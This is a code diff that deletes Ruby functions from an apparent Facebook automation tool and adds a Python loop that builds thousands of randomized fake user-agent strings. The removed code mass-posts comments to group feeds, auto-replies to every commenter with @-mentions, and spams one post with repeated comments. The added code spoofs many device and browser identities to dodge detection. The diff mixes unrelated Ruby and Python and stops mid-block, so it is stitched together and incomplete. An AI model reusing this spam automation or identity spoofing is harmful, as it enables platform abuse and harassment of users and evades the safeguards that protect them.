-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    CommentPostMenu()
-  end
-end
-
-def CommentGroup()
-  s = 0
-  f = 0
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}[!] Use <> For New Line")
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] Group Id : ")
-  id = gets.chomp!
-  print ("#{$w}[+] Comment : ")
-  body = gets.chomp!
-  print ("#{$w}[+] Limit : ")
-  limit = gets.to_i
-  a = Request("group?id=#{id}")
-  if a.key? ('error')
-    puts ("#{$y}[!] Group Not Found")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    CommentPostMenu()
-  else
-    tik ("#{$w}[+] Group Name : #{a['name']}")
-    puts ("#{$w}#{'═'*52}")
-    b = Request("v3.0/#{id}?fields=feed.limit(#{limit})")
-    if !b.key? ('feed')
-      puts ("#{$y}[!] No Post")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      CommentPostMenu()
-    else
-      sub = body.tr("<>","\n")
-      msg = ERB::Util.url_encode(sub)
-      for i in b['feed']['data']
-        id = i['id']
-        c = Request("POST","#{id}/comments?message=#{msg}")
-        if !c.key? ('error')
-          s += 1
-          puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success : #{$c}#{body[0...6]}... #{$w}-> #{$y}#{id}")
-        else
-          f += 1
-          puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed  : #{$c}#{body[0...6]}... #{$w}-> #{$y}#{id}")
-        end
-      end
-      puts ("#{$w}#{'═'*52}")
-      puts ("#{$g}[✓] Succes : #{s}")
-      puts ("#{$y}[!] Failed : #{f}")
-      puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      CommentPostMenu()
-    end
-  end
-end
-
-def ReplyComment()
-  system ('clear')
-  s = 0
-  f = 0
-  puts ($logo)
-  puts ("#{$w}[!] Use <> For New Line")
-  puts ("#{$w}[!] Use @tag to mention users")
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] Post Id : ")
-  id = gets.chomp!
-  print ("#{$w}[+] Comment : ")
-  body = gets.chomp!
-  #sub = body.gsub("<>","\n")
-  print ("#{$w}[+] Limit : ")
-  limit = gets.to_i
-  puts ("#{$w}#{'═'*52}")
-  a = Request("#{id}/comments?limit=#{limit}")
-  if !a.key? ('data')
-    puts ("#{$y}[!] Post Not Found")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    CommentPostMenu()
-  elsif a['data'].empty?
-    puts ("#{$y}[!] No Comments On Posts")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    CommentPostMenu()
-  else
-    for i in a['data']
-      id = i['id']
-      user = '@['+i['from']['id']+ ':]'
-      name = i['from']['name']
-      #puts user
-      sub = body.gsub("@tag",user)
-      msg = sub.gsub("<>","\n")
-      msg = ERB::Util.url_encode(msg)
-      b = Request("POST","#{id}/comments?message=#{msg}")
-      if !b.key? ('error')
-        s += 1
-        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success : #{$c}#{name} #{$w}-> #{$y}#{id}")
-      else
-        f += 1
-        puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed  : #{$c}#{name} #{$w}-> #{$y}#{id}")
-      end
-    end
-    puts ("#{$w}#{'═'*52}")
-    puts ("#{$g}[✓] Succes : #{s}")
-    puts ("#{$y}[!] Failed : #{f}")
-    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    CommentPostMenu()
-  end
-end
+for xd in range(10000):
+    aa='Mozilla/5.0 (Linux; U; Android 11;'
+    b=random.choice(['6','7','8','9','10','11','12'])
+    c='fr-fr; Redmi Note 11 Build/'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+#Mozilla/5.0 (Linux; U; Android 11; fr-fr; Redmi Note 11 Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn
+#Mozilla/5.0 (Linux; Android 13; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36
+    aa='Mozilla/5.0 (Linux; Android 13;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Redmi Note 10 Pro'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/107.0.0.0 Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
     
-def SpamComment()
-  system ('clear')
-  s = 0
-  f = 0
-  puts ($logo)  
-  puts ("#{$w}[!] Use <> For New Line")
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] Post Id : ")
-  id = gets.chomp!
-  print ("#{$w}[+] Comment : ")
-  body = gets.chomp!
-  sub = body.tr("<>","\n")
-  msg = ERB::Util.url_encode(sub)
-  print ("#{$w}[+] Limit : ")
-  limit = gets.to_i
-  #puts ("#{$w}#{'═'*52}")
-  a = Request("#{id}?")
-  if a.key? ('from')
-    tik ("#{$w}[+] Posted By #{a['from']['name']}")
-    puts ("#{$w}#{'═'*52}")
-    limit.times do
-      b = Request("POST","#{id}/comments?message=#{msg}")
-      if b.key? ('id')
-        s += 1
-        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success : #{$c}#{body[0...8]}... #{$w}-> #{$y}#{id}")
-      else
-        f += 1
-        puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed  : #{$c}#{body[0...8]}... #{$w}-> #{$y}#{id}")
-      end
-    end
-    puts ("#{$w}#{'═'*52}")
-    puts ("#{$g}[✓] Succes : #{s}")
-    puts ("#{$y}[!] Failed : #{f}")
-    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    CommentPostMenu()
-  else
-    puts ("#{$y}[!] Post Not Found")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    CommentPostMenu()
-  end
-end
+    
+    aa='Mozilla/5.0 (Linux; Android 10;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Redmi Note 10 Pro'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/107.0.0.0 Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (Linux; Android 12;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Redmi Note 10 Pro'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/107.0.0.0 Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+	
+    aa='Mozilla/5.0 (Linux; Android 11;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Redmi Note 10 Pro'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/107.0.0.0 Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+    
+    aa='Mozilla/5.0 (Linux; Android 9;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Redmi Note 10 Pro'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/107.0.0.0 Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+    
+    #Mozilla/5.0 (Windows NT 11.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5395.113 Safari/537.36
+    aa='Mozilla/5.0 (Linux; Android 10;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Redmi Note 7S'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/83.0.4103.101 Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+    
+    
+    
+    aa='Mozilla/5.0 (Linux; Android 7.0;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Redmi Note 4 Build/NRD90M)'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/107.0.0.0 Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+    
+    
+    
+    aa='Mozilla/5.0 (Linux; Android 13;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Vivo Y91C)'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/107.0.0.0 Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+    
+    #Mozilla/5.0 (Windows NT 11.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5395.113 Safari/537.36
+    aa='Mozilla/5.0 (Linux; Android 13;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Redmi Note 10 Pro'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/107.0.0.0 Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+	
+    aa='Mozilla/5.0 (Windows NT 10.0; Win64;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Windows NT 10.0; Win64'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+	
+    aa='Mozilla/5.0 (X11; CrOS x86_64 15183.78.0;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['X11; CrOS x86_64 15183.78.0'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/108.0.5359.172 Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+    
+    aa='Mozilla/5.0 (X11; CrOS armv7l 15183.78.0;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['X11; CrOS armv7l 15183.78.0'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/108.0.5359.172 Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+    
+    
+    aa='Mozilla/5.0 (X11; CrOS aarch64 15183.78.0;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['X11; CrOS aarch64 15183.78.0'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/108.0.5359.172 Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+	
+	#Mozilla/5.0 (Windows NT 11.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5395.113 Safari/537.36
+	
+    aa='Mozilla/5.0 (Linux; Android 12; SM-A135F;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Linux; Android 12; SM-A135F'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/108.0.0.0 Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+    
+    #Mozilla/5.0 (Windows NT 11.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5395.113 Safari/537.36
+    
+    aa='Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/E7FBAF'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+    
+    
+    #Mozilla/5.0 (Android 10; Xiaomi Redmi Note 9 Pro Max) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 SurfBrowser/3.0
+    aa='Mozilla/5.0 (Android 10; Xiaomi Redmi Note 9 Pro Max;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Android 10; Xiaomi Redmi Note 9 Pro Max'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/30.0.0.0 Mobile Safari/537.36 SurfBrowser/3.0'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+    
+    #Mozilla/5.0 (Windows NT 11.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5395.113 Safari/537.36
+    aa='Mozilla/5.0 (Windows NT 10.0;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Windows NT 10.0'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/109.0.0.0 Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+    #Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
+    aa='Mozilla/5.0 (Windows NT 10.0;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Windows NT 10.0; WOW64; Trident/7.0; rv:11.0'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='like Gecko'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+    
+    #Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76
+    aa='Mozilla/5.0 (Windows NT 10.0; Win64; x64;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Windows NT 10.0; Win64; x64'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+    
+    #Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Vivaldi/5.6.2867.50
+    
+    aa='Mozilla/5.0 (Windows NT 10.0; Win64; x64;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Windows NT 10.0; Win64; x64'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/109.0.0.0 Safari/537.36 Vivaldi/5.6.2867.50'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+    
+    #Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+    
+    
+    aa='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Windows NT 10.0; Win64; x64; rv:108.0'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
